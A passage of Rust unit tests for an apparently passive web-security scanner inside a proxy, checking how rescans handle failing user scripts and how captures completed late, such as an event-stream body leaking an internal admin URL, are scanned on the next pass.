        for check in settings.scripts.iter_mut().filter(|c| c.name.starts_with("gone")) {
            check.sha256 = "0".repeat(64);
        }
        s.set_setting(SETTINGS_KEY, &settings).unwrap();
        record(&mut s, "/boom");
        let stats = rescan(&mut s).unwrap();
        assert_eq!(stats.script_errors.len(), SCRIPT_ERRORS, "only so many are listed");
        assert_eq!(stats.failed_scripts.len(), names.len(), "{:?}", stats.failed_scripts);
        assert!(!stats.script_errors.iter().any(|e| e.script == "zz-throws"));
        // Not one finding went, the unlisted script's included.
        assert_eq!(stats.removed, Some(0));
        assert_eq!(s.findings_list(&FindingFilter::default(), 100).unwrap().len(), names.len());
        clean(dirs);
    }

    /// A row completed after the scanner passed it, by a process with no time to scan it (an
    /// event stream's row as the proxy stops), is scanned by the next scan.
    #[test]
    fn a_row_left_for_later_is_scanned_by_the_next_scan() {
        let mut store = Store::open_in_memory().unwrap();
        let target = Target::from_url("http://a.test").unwrap();
        let request = b"GET /events HTTP/1.1\r\nHost: a.test\r\n\r\n";
        let head = "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nX-Content-Type-Options: nosniff\r\n\r\n";
        let id = store.record(&Capture::new("proxy", &target, request, Some(head.as_bytes()), Some(1), None)).unwrap();
        let opened = scan_pending(&mut store).unwrap();
        assert_eq!((opened.scanned, opened.last_id), (1, id));
        let findings =
            |s: &Store| s.query("SELECT count(*) FROM findings", &[], 1, 100).unwrap().rows[0][0].as_i64().unwrap();
        let before = findings(&store);

        // The body arrives with something in it to find; nobody scans the row.
        let body = format!("{head}data: {{\"internal\": \"http://10.11.12.13:8080/admin\"}}\n\n");
        store
            .update_capture(id, &Capture::new("proxy", &target, request, Some(body.as_bytes()), Some(9), None))
            .unwrap();
        assert_eq!(scan_pending(&mut store).unwrap().scanned, 0, "the scanner has passed the row");
        assert_eq!(findings(&store), before);

        scan_later(&store, &[id, id]).unwrap();
        let next = scan_pending(&mut store).unwrap();
        assert_eq!(next.scanned, 1);
        assert!(next.new_findings > 0 && findings(&store) > before, "{next:?}");
        // Once: the list is empty again.
        assert_eq!(scan_pending(&mut store).unwrap().scanned, 0);
    }
}
